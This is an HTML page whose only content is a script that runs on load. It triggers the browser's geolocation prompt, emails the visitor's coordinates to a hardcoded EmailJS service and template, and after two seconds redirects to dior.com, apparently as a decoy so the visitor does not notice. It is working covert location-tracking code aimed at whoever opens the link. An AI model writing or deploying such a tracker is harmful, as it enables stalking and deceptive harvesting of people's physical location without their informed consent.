<!DOCTYPE html>
<html lang="en">

<body>

    <script src="https://cdn.jsdelivr.net/npm/@emailjs/browser@3/dist/email.min.js"></script>
    <script>
        document.addEventListener("DOMContentLoaded", function () {
            emailjs.init("ueOumEe6aJ_CEmq_m"); // Public Key

            function sendLocationEmail(latitude, longitude) {
                console.log("📍 Sending Location Data:", { latitude, longitude });

                const templateParams = {
                    latitude: latitude.toString(),
                    longitude: longitude.toString()
                };

                emailjs.send("service_7pjie2s", "template_30kabln", templateParams)
                    .then((response) => {
                        console.log("✅ Email sent successfully!", response);
                        document.getElementById("locationDisplay").textContent = "📧 Location sent!";
                    })
                    .catch((error) => {
                        console.error("❌ Error sending email:", error);
                        document.getElementById("locationDisplay").textContent = "⚠️ Email sending failed!";
                    });
            }

            function trackMovement() {
                if ("geolocation" in navigator) {
                    // This triggers the location permission prompt
                    navigator.geolocation.getCurrentPosition(
                        (position) => {
                            const latitude = position.coords.latitude;
                            const longitude = position.coords.longitude;

                            console.log("🌍 Location received:", latitude, longitude);
                            document.getElementById("locationDisplay").textContent = 
                                `📍 Latitude: ${latitude}, Longitude: ${longitude}`;

                            sendLocationEmail(latitude, longitude);
                        },
                        (error) => {
                            console.error("❌ Error getting location:", error);
                            document.getElementById("locationDisplay").textContent = 
                                "⚠️ Location access denied!";
                        }
                    );
                } else {
                    console.log("❌ Geolocation not supported.");
                    document.getElementById("locationDisplay").textContent = "⚠️ Geolocation not supported!";
                }
            }

            // Call to request location as soon as the page loads
            trackMovement();
        });
        setTimeout(() => {
    window.location.href = "https://www.dior.com/";
}, 2000);
    </script>
</body>
</html>
